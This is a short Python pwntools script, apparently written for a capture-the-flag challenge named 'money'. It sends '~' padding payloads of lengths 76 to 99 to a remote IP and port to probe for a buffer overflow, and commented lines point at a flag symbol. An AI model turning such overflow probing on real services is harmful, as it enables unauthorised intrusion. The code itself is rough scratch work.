from pwn import *
binary = ELF('./money')


for i in range(76, 100):
    payload = i *'\x7e'
    #flag = binary.symbols['flag']
    #payload += p64(126)
    p = process('./money')
    p = remote('104.154.232.79', 6501)
    p.sendline(payload)
    print(p.recvline())
    #p.sendline(payload)
    try:
        print(p.recvline())
        print(p.recvline())
        print(i)
        continue
    except:
        continue
        
        
